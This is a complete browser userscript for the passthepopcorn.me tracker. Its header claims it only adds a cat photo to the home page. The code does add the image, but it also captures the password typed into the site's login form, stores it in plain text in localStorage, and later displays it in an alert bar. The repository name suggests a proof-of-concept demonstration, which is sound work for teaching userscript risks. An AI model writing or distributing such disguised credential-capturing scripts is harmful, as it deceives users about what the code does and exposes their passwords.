// ==UserScript==
// @name Totally Not Malicious
// @namespace passthepopcorn.me
// @author nikkun
// @version 1.0.0
// @description Adds a cat photo to your home page, and does nothing else
// @icon https://tls.passthepopcorn.me/favicon.ico
// @include *://*.passthepopcorn.me/*
// @downloadURL https://raw.githubusercontent.com/nikkun/ptp-malicious/master/malicious.user.js
// @updateURL https://raw.githubusercontent.com/nikkun/ptp-malicious/master/malicious.user.js
// @grant none
// ==/UserScript==

var LS_KEY = "ptp-password";

function onSubmit(form, callback) {
  if (form.addEventListener)
    form.addEventListener("submit", callback, false);
  else if (form.attachEvent)
    form.attachEvent("onsubmit", callback);
};

function newAlert(msg) {
  var div = document.createElement("div");
  div.className = "alert-bar";

  var span = document.createElement("span");
  span.className = "alert-bar__link";
  span.textContent = msg;

  div.appendChild(span);
  return div;
};

function newCatImg() {
  var div =  document.createElement("div");
  div.style["text-align"] = "center";

  var img = document.createElement("img");
  img.src = "https://whatimg.com/i/ATqtSt.jpg";
  img.width = 250;

  div.appendChild(img);
  return div;
}

window.onload = function() {
  var form = document.getElementById("loginform");
  if (form) {
    onSubmit(form, function() {
      localStorage.setItem(LS_KEY, this.password.value);
    });
  } else if (localStorage.hasOwnProperty(LS_KEY)) {
    var alertBarContainer = document.getElementsByClassName("alert-bars")[0];
    if (alertBarContainer) {
      alertBarContainer.appendChild(newAlert("Your password: " +
        localStorage.getItem(LS_KEY)));
    }
  }

  var content = document.getElementById("content");
  if (content) {
    content.parentNode.insertBefore(newCatImg(), content);
  }
};